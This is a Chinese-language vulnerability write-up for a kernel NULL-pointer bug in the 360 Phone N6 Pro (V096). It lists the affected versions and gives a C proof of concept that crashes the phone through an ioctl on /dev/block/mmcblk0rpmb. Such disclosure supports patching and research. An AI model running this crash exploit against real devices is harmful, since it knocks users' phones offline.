<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>360 Phone N6 Pro内核漏洞</h1><h2>一、漏洞简介</h2><p>360 Phone N6 Pro V096内核组件中的内核模块允许攻击者使用命令<strong>3235427072</strong>在设备/ dev / block / mmcblk0rpmb上通过ioctl的自变量注入精心设计的自变量，并导致内核崩溃。</p><h2>二、漏洞影响</h2><ul><li>名称：360 Phone N6 Pro</li><li>型号：1801-A01</li><li>安卓版本：7.1.1</li><li>版本号：V096</li><li>内核版本：Linux localhost 4.4.21-perf＃1 SMP PREEMPT Wed Mar 28 28 15:24:20 UTC 2018 aarch64</li></ul><h2>三、复现过程</h2><h3>poc</h3><p>/*<br />* This is poc of 360 N6 Pro, 1801-A01<br />* Android Version: 7.1.1<br />* Version Number: V096<br />* Kernel Version: Linux localhost 4.4.21-perf #1 SMP PREEMPT Wed Mar 28 15:24:20 UTC 2018 aarch64<br />* A NULL pointer bug in the ioctl interface of device file /dev/block/mmcblk0rpmb causes the system crash via IOCTL 3235427072.<br />* This Poc should run with permission to do ioctl on /dev/block/mmcblk0rpmb.<br />*/<br />#include &lt;stdio.h&gt;<br />#include &lt;fcntl.h&gt;<br />#include &lt;errno.h&gt;<br />#include &lt;sys/ioctl.h&gt;<br /><br />const static char *driver = "/dev/block/mmcblk0rpmb";<br />static command = 3235427072; // 0xc0d8b300<br /><br />int main(int argc, char **argv, char **env) {<br />int fd = 0;<br />fd = open(driver, O_RDWR);<br />if (fd &lt; 0) {<br />printf("Failed to open %s, with errno %dn", driver, errno);<br />system("echo 1 &gt; /data/local/tmp/log");<br />return -1;<br />}<br /><br />printf(&quot;Try ioctl device file '%s', with command 0x%x and payload NULLn&quot;, driver, command);<br />printf("System will crash and reboot.n");<br />if(ioctl(fd, command, NULL) &lt; 0) {<br />printf("Allocation of structs failed, %dn", errno);<br />system("echo 2 &gt; /data/local/tmp/log");<br />return -1;<br />}<br />close(fd);<br />return 0;</p></body></html>